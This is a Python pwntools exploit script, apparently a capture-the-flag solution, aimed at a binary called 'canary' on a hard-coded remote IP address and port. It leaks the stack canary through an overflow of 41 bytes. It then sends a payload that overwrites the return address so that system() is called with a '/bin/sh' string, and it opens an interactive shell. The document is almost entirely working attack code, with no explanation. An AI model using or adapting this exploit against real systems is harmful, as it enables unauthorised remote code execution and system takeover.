#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('canary')

host = args.HOST or '116.203.30.62'
port = int(args.PORT or 18113)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recv()
io.send('A' * 41)
io.recv()
data = "\x00" + io.recv().replace('A', '').strip()[:3]
print("data: " + data)
print(len(data))
canary = u32(data)
print (hex(canary))

binsh = 0x71EB0
system = 0x00016d90
io.send("A" * 40 + p32(canary) + p32(binsh) * 3 + p32(system) + p32(binsh) * 4)

io.interactive()

